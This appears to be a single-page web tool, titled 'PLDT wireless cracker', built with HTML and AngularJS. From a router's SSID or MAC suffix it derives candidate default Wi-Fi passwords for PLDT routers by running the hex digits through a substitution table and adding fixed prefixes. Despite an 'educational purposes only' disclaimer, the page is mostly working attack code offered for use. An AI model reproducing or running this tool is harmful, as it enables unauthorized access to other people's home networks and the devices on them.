<body ng-controller="MainCtrl">

    <nav class="navbar navbar-inverse navbar-fixed-top">
        <div class="container">
            <div class="navbar-header">
                <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
                <a class="navbar-brand" href="#">PLDT wireless cracker</a>
            </div>
            <div id="navbar" class="navbar-collapse collapse">

            </div>
            <!--/.navbar-collapse -->
        </div>
    </nav>

    <!-- Main jumbotron for a primary marketing message or call to action -->
    <div class="jumbotron">
        <div class="container">
            <p>Disclaimer:This code is meant for educational purposes only.</p>
            <p>email: adrivanrex@gmail.com</p>
        </div>
    </div>

    <div class="container">
        <div class="row">

        <h2>PLDT wireless cracker</h2>
        <p>Last 6 MAC ADDRESS or wireless SSID(PLDTFIBR_c5c4c9) </p>
        <form class="form-inline" ng-submit="submitMac()">
            <div class="form-group">
              <input type="text" ng-model="Mac" placeholder="PLDTFIBR_c5c4c9"  value="PLDTFIBR_c5c4c9" class="form-control">
            </div>
            <div class="form-group">
            </div>
            <button type="submit" class="btn btn-success">Submit</button>
          </form>
        </div>

        <div ng-show="pagecontent">
        <div class="row">
          <div class="alert alert-success">
            <strong>Password:</strong> {{output}}
          </div>

          

        </div>

        <div class="row">
          <div class="alert alert-success">
            <strong>Password:</strong> {{oldoutput}}
          </div>
        </div>
        <div class="row">
          <div class="alert alert-success">
            <strong>Password:</strong> {{mybrooldoutput}}
          </div>
        </div>
        </div>




            <hr>

            <footer>
                <p>&copy; 2016 Company, Inc.</p>
            </footer>
        </div>
    </div>
    <!-- /container -->


    <!-- Bootstrap core JavaScript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
     <script>
        angular.module('PLDT', [])
          .controller('MainCtrl', ['$scope','$http', function($scope,$http) {
            $scope.pagecontent = false;

            $scope.submitMac = function(){
              $scope.pagecontent = true;
              stg = this.Mac;
              str = stg.replace("PLDTFIBR_","");
              console.log("shit", str);
              function letterValue(str){
                  var anum={
                      0:"f",
                      1:"e",
                      2:"d",
                      3:"c",
                      4:"b",
                      5:"a",
                      6:9,
                      7:8,
                      8:7,
                      9:6,
                      c:3,
                      d:2,
                      e:1,
                      f:0,
                  }
                  if(str.length== 1) return anum[str] || str;
                  return str.split('').map(letterValue);
              }


              $scope.output = [];
              


              for (var i = str.length - 1; i >= 0; i--) {
                $scope.output.push(letterValue(str.charAt(i)));
              }
              console.log($scope.output);
              $scope.output.reverse();
              $scope.output = 'wlan'+$scope.output.join("");
              $scope.oldoutput = 'PLDTWIFI'+str.substring(1).toUpperCase();
              $scope.mybrooldoutput = 'myBROWIFI'+str.substring(1).toUpperCase();

            };
            
          }]);
</script>

</body>

</html>
